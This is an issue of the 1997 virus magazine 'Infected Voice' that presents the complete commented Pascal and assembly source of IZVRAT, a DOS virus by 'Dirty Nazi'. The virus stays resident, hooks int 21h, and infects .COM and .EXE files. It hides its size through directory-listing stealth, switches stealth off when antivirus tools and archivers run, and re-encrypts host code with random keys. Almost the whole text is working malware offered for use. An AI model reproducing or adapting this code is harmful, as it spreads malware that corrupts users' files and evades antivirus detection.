{
      ‹‹                  €
     ﬂﬂﬂ  Virus Magazine  € Box 176, Kiev 210, Ukraine      IV  1997
     ﬂ€€ ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ € ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ ﬂ ﬂﬂﬂﬂﬁﬂﬂﬂ  €ﬂﬂﬂﬂﬂﬂ€
      ﬁ€ €ﬂ‹ €ﬂﬂ ‹ﬂﬂ ‹ﬂﬂ ‹€‹ ‹ﬂﬂ €ﬂ€    › € ‹ﬂ€ € ‹ﬂﬂ €‹‹   € ﬂﬂﬂ€ €
       € € € €ﬂ  €ﬂ  €    €  €ﬂ  € €    € € € € € €   €     € ‹‹‹€ €
       € ﬁ ﬁ ﬁ   ﬁ‹‹ ﬁ‹‹  ﬁ  ﬁ‹‹ ﬁ‹ﬂ     ﬂ€ ﬂ‹€ ﬁ ﬁ‹‹ ﬁ‹‹‹  € €‹‹‹ €
       ﬁ ‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹  €‹‹‹‹‹‹€
          (C) Copyright, 1994-97, by STEALTH group WorldWide, unLtd.
                              sgww@hotmail.com
            Digest of IV 8 - 11 russian, including Moscow issues


        IZVRAT - resident stealth virus with a little encryption (used
 against Adinf Cure Module, TBClean etc. - infected file cannon be
 restored), infects *.COM *.EXE files. Such name (IZVRAT can be
 translated as Distortion) virus got because it is real distortion -
 resident stealth via Pascal. I haven't seen other TSR viriis,
 written in Pascal (I saw only Sentinel, that is written in HLL (High
 Level Language) too, but I think it is written in C). IZVRAT can infect
 antivirus program without problems - infected file is cured before
 execution and then infected again ;)

P.S.  Many thanks to Int O`Dream for bugs fixing & some algoritms.

                                                       Dirty Nazi, 1995

}

{$M 2048 , 0 , 0}   { 2K stack, no heap }
Uses Dos;
Const
     Buf   : Array [1..6] of Char = ('I','Z','V','R','A','T');
     { Const Buf used for detection DS:DX of current program }
     VirLen = 5555; { length of packed with PkLite -E virus }
Var
  Regs        : Registers;
  Int21 , Old : Pointer;
  I , J       : Integer;
  Sr          : SearchRec; { to find victims }
  Ext         : ExtStr; { file extention }
  EXEBuf      : Array[1..VirLen] of Char;{ buffer for part of
                                           infected program }
  MyBuf       : Array[1..VirLen] of Char;{ buffer for virus body }
  CopyLeft    : Array [1..17] of String;{ this array contains text strings }
  IE        :  Array [1..2] of Char;{ to check virus body }
  F         :  File; { file handle }
  Coder , Decoder : Byte; { to crypt / decrypt }
  CmdLine   : String; { to save command line parameters }
  OurName   : String; { our full name (including path) }
  Attr      : Byte;   { file attributes }
  Time      : LongInt; { date / time }

 procedure CheckWriteProtect;       { check for write protected disk }
 Label Shaise , Ob;
  begin

   FindFirst(ParamStr(0) , AnyFile , Sr);
   Assign(F , '\'+#$FF);     { Invisible file ! }
   ReWrite(F);      { create and delete "invisible" file }
   Erase(F);

   If IOResult <> 0 Then GoTo Shaise; { if there was an error, then, maybe
                                        disk is ReadOnly - jmp Shaise }

   Assign(F , Copy(OurName, 1 , Length(OurName) - Length(Sr.Name)) + #$FF);

   ReWrite(F);
   Erase(F);

   If IOResult <> 0 Then GoTo Shaise;

   GoTo Ob;                       { jump to the end of this procedure }

Shaise:
   WriteLn(CopyLeft[7]);        { Tell user "Abnormal program ter- }
   Halt(8);                     { mination" and quit to DOS }
Ob:
 end;   { end proc }

function CheckTSR : Boolean;    { Check if we already installed, }
  begin                         { returns TRUE if we're already }
    Regs.AX:=$BA69;             { in memory }
    Intr($21 , Regs);
    CheckTSR:=False;
    If Regs.AX=$69BA then CheckTSR:=True;
  end;

                          { Infection from TSR part }
procedure my21h(az:word); { This procedure is called with AX as parameter }
var
    Inf  : Byte;          { counter of infected files }
    DT   : DateTime;      { to change date/time }

label Q1,AI,On;        { label to quit Q1 }
         { label AI (Already Infected) to jump direct to FindNext }
begin
          asm
             XOR AX,AX             { Restore DS:DX (we've saved it to  }
             MOV DS,AX             { int E4h) }
             LDS DX,DS:[0E4h*4]
          end;
     Inf:=0; { Reset counter of infected files }

     If Hi(Az) <> $5B Then
      If Hi(Az) <> $41 Then GoTo Q1;

     { We infect files if only function of int 21h 5Bh (create new file }
     { or 41h (delete file) was called. If other function is called, }
     { we give control to original int 21h }

     asm
       PUSH AX          { Save AX }
       IN AL,21h        { Turn keyboard off }
       OR AL,3
       OUT 21h,AL
       POP AX           { Restore AX }
     end;

     FindFirst(CopyLeft[9] , AnyFile , Sr);
    { Search for *.* files with any attributes }
    { All texty strings like *.*, .EXE and so on located in array }
    { CopyLeft and encrypted (xor 47h) }

      While DosError = 0 Do
       begin
           Ext:=Copy(Sr.Name , Length(Sr.Name) - 3 , Length(Sr.Name));
          { Get extention of found file }

           If Ext <> CopyLeft[8] Then
                                           { If .EXE or .COM -- then }
           If Ext <> CopyLeft[15] Then GoTo Ai;
                                           { begin infection }
            If Sr.Attr = Directory Then GoTo Ai;
     { Check if some motherfucker created directory with ?.EXE or ?.COM
       extention }

            Time:=Sr.Time;       { Save date & time of found file }
            UnPackTime(Time , DT); { Unpack date & time }
}
            If ((Dt.Month = 5) And (Dt.Day = 21)) Then GoTo Ai;
        { If date is 05/21/?? - already infected - jump to FindNext }

            If Sr.Name = CopyLeft[10] Then GoTo Ai;
            If Sr.Name = CopyLeft[11] Then GoTo Ai;
            If Sr.Name = CopyLeft[12] Then GoTo Ai;
            If Sr.Name = CopyLeft[13] Then GoTo Ai;
            If Sr.Name = CopyLeft[16] Then GoTo Ai;
            If Sr.Name = CopyLeft[17] Then GoTo Ai;
 {  These programs will not be infected }

     If Sr.Size < 10240 Then GoTo Ai;
   { If size of file is below 10k - we don't infect such files too }
     If ((Ext = CopyLeft[15]) And (Sr.Size > 64000 - VirLen)) Then GoTo Ai;
   { Check if .COM-file length wasn't above 64000 - virus length }
            If Sr.Attr <> $20 Then GoTo Ai;
        { Check attributes: if not Archive, we don't infect it }

            Attr:=Sr.Attr;          { Save file attributes }

            Assign(F , Sr.Name);    { Assign handle with found file }
            SetFAttr(F , Archive);  { Set Archive attribute }
            Reset(F , 1);           { Open file for read/write }
            If IOResult <> 0 Then GoTo Ai; { if there was an error, }
   { we jump to FindNext }

            BlockRead(F , EXEBuf , VirLen); { Read the beginning of the
                                              program }

            Coder:=0;                       { Reset coder/decoder byte }

            MyBuf[160]:=Chr(Coder); { Save coder/decoder byte to }
                                    { virus body }

            Seek(F , 0);                    { Move pointer to the
                                              beginning of the file }
            BlockWrite(F , MyBuf, VirLen);  { Write virus body }
            Seek(F , Sr.Size);              { Move pointer to the end }
                                              of file }
            BlockWrite(F , EXEBuf , VirLen); { Write original beginning }
                                             { of the file }

            SetFAttr(F , Attr);     { Restore attributes }

            Dt.Month:=5;            { Change file date to 05/21/?? }
            Dt.Day:=21;
            PackTime(DT , Time);    { Pack date/time }

            Reset(F);               { Open file again (if we don't, Close) }
                                    { command will change date/time) }
            SetFTime(F , Time);     { Set file date/time }
            Close(F);               { Close file }
            Inc(Inf);      { Increment counter of infected files }

            If Inf>=1 Then GoTo On;
            { If counter is above 1 - return control to OS }
Ai:
            FindNext(Sr);    { Find next file }
       end;    { end While }
On:
       asm
         PUSH AX      { save AX }
         IN   AL,21h  { turn keyboard on }
         AND  AL,$FC
         OUT  21h,AL
         POP  AX      { restore AX }
       end;
Q1:

end;    { end proc }


                      { Our int 21h handler }
 procedure New21h; Assembler;
  label NEXT,STE,END_STE,END_C,_EXEC,FINAL,FUCK,NON,STEALTH,ASD,QWE;

   asm
      PUSHF               { Save flags }
      CMP AX,0BA69h       { To check virus presence in memory }
      JNZ NEXT            { if AX <> BA69h, then it isn't our call }
      MOV AX,69BAh        { return 69BAh }
      POPF                { Restore flags }
      RETF 2              { quit from int 21h handler }
Next:
      CMP AH, 4Ch         { if function 4Ch is called (end of process), }
      JZ  FINAL           { turn on our stealth-mechanism }
      CMP AX, 0ADDFh      { if AX contains ADDFh, turn stealth on too, }
      JZ  FINAL           { it was made for compatibility with }
                          { non-resident part of virus }
      CMP WORD PTR [CS:STEALTH],1
      JNZ ASD
      POPF
      INT 0E3h            { Here we call original int 21h, saved }
                          { in int E3h }
      RETF 2
ASD:
      CMP AH, 4Bh        { if function 4Bh is called (load and execute), }
      JZ  _EXEC          { we check, what program is executed }
      CMP AX, 0FDDAh     { If AX contains FDDAh, turn off stealth }
      JNZ QWE            { (for compatibility again) }

      POPF
      PUSH ES
      PUSH DS
      DB   60h           { PUSHA - save all registers }

      PUSHF
      JMP NON            { Jump to turn stealth off }
QWE:
      CMP AH, 4Eh        { If functions 4Eh (FindFirst) or 4Fh }
      JZ STE             { (FindNext) is called, jump to the stealth part }
      CMP AH, 4Fh
      JZ STE
      POPF               { restore flags }
      PUSH ES     { save ES }
      PUSH DS     { and DS }
      DB 60h      { and all other registers to stack }
      PUSHF       { and flags too }
      PUSH AX     { First parameter for pascal procedure into stack (AX) }
      CALL MY21h  { call our pascal procedure My21h }
FUCK:
      POPF                { restore flags }
      DB 61h              { POPA - restore all registers }
      POP DS              { Restore DS }
      POP ES              { and ES }
      INT 0E3h            { Call old int 21h }
      RETF 2

STE:                      { Here our stealth begins }
      POPF
      INT 0E3h            { Call old int 21h to get info }
      JC END_C            { If Carry Flag is set (some error) ,}
                          { jump to quit }

      PUSHF               { Save flags }
      PUSH DS             { Save DS and ES }
      PUSH ES
      DB  60h             { Save all other regs }
      MOV AH,2Fh          { Call original int 21h to get }
      INT 0E3h            { Data Tranfer Area (DTA) }
      MOV AX, WORD PTR ES:[BX+18h]
                          { Get file date to AX }
      MOV DX, AX    { Save AX to DX to use it later }
      AND AL, 1Fh
      CMP AL, 21    { Compare day, if <> 21, then we don't need it }
      JNZ END_STE
      AND DL, 0A0h  { Now we will use DX }
      CMP DL, 160   { compare month, if <> 5, then we don't care about it }
      JNZ END_STE
      SUB WORD PTR ES:[BX+1Ah],VirLen
   { If Day = 21 and Month = 5 then decrease length of program on virus }
   { length }

END_STE:       { this is the end of the stealth }
      DB 61h   { Restore all chaos in registers }
      POP ES
      POP DS
      POPF
END_C:
      RETF 2
_EXEC:         { Here we check what programs is being executed }

      POPF
      PUSH ES
      PUSH DS
      DB 60h
      PUSHF
      PUSH DS
      POP ES
      PUSH DX
      POP DI
      MOV CX, 40h
      MOV AL, '.' { seaching for the dot in program name }
      CLD
      REPNE SCASB
      JNE FUCK    { Dot not found - jump to fuck }
      SUB DI, 3

      CMP WORD PTR [ES:DI],'BE'  { fucking drwEB }
      JZ NON                     { Is it really WEB? Yes? Turn stealth off }
      CMP WORD PTR [ES:DI],'FN'  { adiNF }
      JZ NON
      CMP WORD PTR [ES:DI],'TS'  { aidsteST }
      JZ NON
      CMP WORD PTR [ES:DI],'NA'  { scAN }
      JZ NON

     { Check for archivators (if we don't, all archived infected files }
     { will no longer work }

      CMP WORD PTR [ES:DI],'RA'    { rAR }
      JZ NON
      CMP WORD PTR [ES:DI],'JR'    { aRJ }
      JZ NON
      CMP WORD PTR [ES:DI],'AH'    { HA }
      JZ NON
      CMP WORD PTR [ES:DI],'PI'    { zIP }
      JZ NON
      CMP WORD PTR [ES:DI],'KA'    { pAK }
      JZ NON
      JMP FUCK    { that's all - stealth is on for other programs }

Non:
      MOV WORD PTR [CS:STEALTH],1
     { 1 - stealth is off, 0 - stealth is on }
      JMP FUCK
Stealth:
      DW 0

Final:
      POPF
      MOV WORD PTR [CS:STEALTH],0
      INT 0E3h
      RETF 2

           { That's the end of asm }
end;       { end proc }

 procedure ExecOriginal;     { Procedure of infected program execution }
  begin

    asm
        MOV AX, 0FDDAh       { Turn off stealth to get real size of }
        INT 21h              { infected program }
    end;

    FindFirst(ParamStr(0) , AnyFile , Sr); { get all info about program
                                             we started from }

    Assign(F , ParamStr(0));

    Time:=Sr.Time;          { Save date/time & file attributes }
    Attr:=Sr.Attr;

    SetFAttr(F , Archive);    { Set Archive attribute }

    Reset(F , 1);             { open file for read/write access }

    Seek(F , Sr.Size - VirLen); { Move pointer to File length - }
                                  Virus length }

    BlockRead(F , EXEbuf , VirLen);   { Read original beginning of }
                                      { program }
    Seek(F , Sr.Size - VirLen);       { Move pointer to File length - }
                                        Virus length again }
    Truncate(F);                      { Truncate file to restore it's
                                        original length }

    For I:=1 To VirLen Do             { Decode original beginning of }
      EXEBuf[I]:=Chr(Ord(EXEBuf[I]) Xor Decoder); { program }

    Seek(F , 0);                      { Move pointer to the start of file }
    BlockWrite(F , EXEBuf , VirLen);  { Write original decoded beginning }

    SetFTime(F , Time);               { Restore original date/time & }
    SetFAttr(F , Attr);               { file attributes }

    Close(F);                         { Close file }

    SwapVectors;
      Exec(GetEnv(CopyLeft[14]) , '/C '+OurName+' '+CmdLine);  { Execute }
    SwapVectors;
    If DosError <> 0 Then       { If there was some error, tell }
         WriteLn(CopyLeft[7]);  { "Abnormal program termination" }

    Assign(F , ParamStr(0));
    SetFAttr(F , Archive);      { Set Archive attribute again }

    Reset(F , 1);               { Open file for read/write access }

    Randomize;

    Coder:=Random(255);         { Get random number from 0 to 255 }

    For I:=1 To VirLen Do       { Encode original beginning of program }
       EXEBuf[I]:=Chr(Ord(EXEBuf[I]) Xor Coder); { with new key code }


 { The cycle below is included for those people, who will try to find }
 { coder/decoder byte in virus body (we're changing 20 bytes all the time }
 { instead of 1 byte) }

    Randomize;
    For I:=147 To 163 Do
       begin
         MyBuf[I]:=Chr(Random(255));
       end;

    MyBuf[160]:=Chr(Coder);  { Save decoder byte in virus body }

    BlockWrite(F , MyBuf , VirLen); { Write virus body to the start }
                                    { of file }

    Seek(F , Sr.Size - VirLen);     { Move pointer to the end of file }

    BlockWrite(F , EXEBuf , VirLen);  { Write encoded beginning }

    SetFTime(F , Time);         { Restore date/time & file attributes }
    SetFAttr(F , Attr);

    Close(F);                   { Close file }


     { Turn stealth mechanism on }
    asm
        MOV AX, 0ADDFh
        INT 21h
    end;

 end;   { end proc }

procedure Init;      { Virus init }
 begin

    { This array contains useful text strings line '*.EXE' and so on, }
    { this array is encrypted }

  CopyLeft[1]:='Izvrat v3.1beta (cl) Dirty Nazi';
  CopyLeft[2]:='Stealth Group World Wide';
  CopyLeft[3]:='Thanks Int O`Dream & Borland';
  CopyLeft[4]:='Happy birthday, Dirty Nazi!';
  CopyLeft[5]:='y ka>|<doro u3 Hac 6bITb moryT pa3HbIe ><odbI,
                Ho ue/\b y Hac eduHa...';
  CopyLeft[6]:='Korda R ymep, He 6bI/\o Hukoro, kTo 6bI eTo onpoBepr...
                AidsTest. :)';
  CopyLeft[7]:='Abnormal program termination';
  CopyLeft[8]:='.EXE';
  CopyLeft[9]:='*.*';
  CopyLeft[10]:='NCMAIN.EXE';
  CopyLeft[11]:='EMM386.EXE';
  CopyLeft[12]:='QEMM.EXE';
  CopyLeft[13]:='SETVER.EXE';
  CopyLeft[14]:='COMSPEC';
  CopyLeft[15]:='.COM';
  CopyLeft[16]:='COMMAND.COM';
  CopyLeft[17]:='STACKER.COM';

   { After compiling you must xor all array with 47h, then pack
     EXE file with PKLITE -E }

   For I:=1 To 17 Do  { Unxor array CopyLeft }
    begin
      For J:=1 To Length(CopyLeft[I]) Do
        begin
          CopyLeft[I,J]:=Chr(Ord(CopyLeft[I,J]) Xor $47);
        end;
    end;

     OurName:=ParamStr(0); { Get the name of program we started from }

     CheckWriteProtect;           { Check if we executed on write- }
                                  { protected drive }
     CmdLine:='';

     Assign(F , ParamStr(0));  { Open our program }
     Reset(F , 1);

     BlockRead(F , MyBuf , VirLen);   { Read virus body to buffer }

     Close(F);                  { Close file }

     Decoder:=Ord(MyBuf[160]);  { Get current decoder byte }

     IF ParamCount <> 0 Then    { If there's some parameters in command }
        Begin                   { line }
           For I:=1 To ParamCount Do
             CmdLine:=CmdLine + ' ' + ParamStr(I); { then we must save }
        End;                                       { them to CmdLine }

 end; { end proc }

 procedure Hide; Assembler;    { Used to hide virus in memory }
   asm
     PUSH ES
     PUSH AX
     MOV AX,0000
     DEC AX
     MOV ES,AX
     MOV WORD PTR ES:[1],70h  { after this procedure all program will }
     POP AX                   { think, that virus body in memory - }
     POP ES                   { DOS environment }
     DB 0EAh
     DW 0
     DW 0
   end;

begin   { * MAIN * }          { Main part of program }


  Init;          { Virus init }
  ExecOriginal;  { Execute original program }
  SwapVectors;   { Restore interrupts, catched by Pascal }

  If Not CheckTSR Then    { Check our presence in memory }
    begin

       GetIntVec($21,Old);  { Get int 21h address }
       SetIntVec($E3,Old);  { Save int 21h to int E3h }
       SetIntVec($21,Addr(New21h)); { Set our int 21h handler }
       SetIntVec($E4,Addr(Buf));   { Save our DS:DX to int E4h }

       Regs.AH:=$62;                { Get PSP address }
       Intr($21 , Regs);


   { Install HIDE procedure directly to memory, this procedure will }
   { get control after our program ends }

       MemW[Seg(Hide):Ofs(Hide)+3]:=Regs.BX;
       MemW[Seg(Hide):Ofs(Hide)+18]:=MemW[Regs.BX:$A];
       MemW[Seg(Hide):Ofs(Hide)+20]:=MemW[Regs.BX:$C];
       MemW[Regs.BX:$A]:=Ofs(Hide);
       MemW[Regs.BX:$C]:=Seg(Hide);

       Keep(0); { Terminate, stay resident }
     { Be afraid, be very afraid - virus is now in memory !!! ;) }

 end;
end.   { * No comments any more * }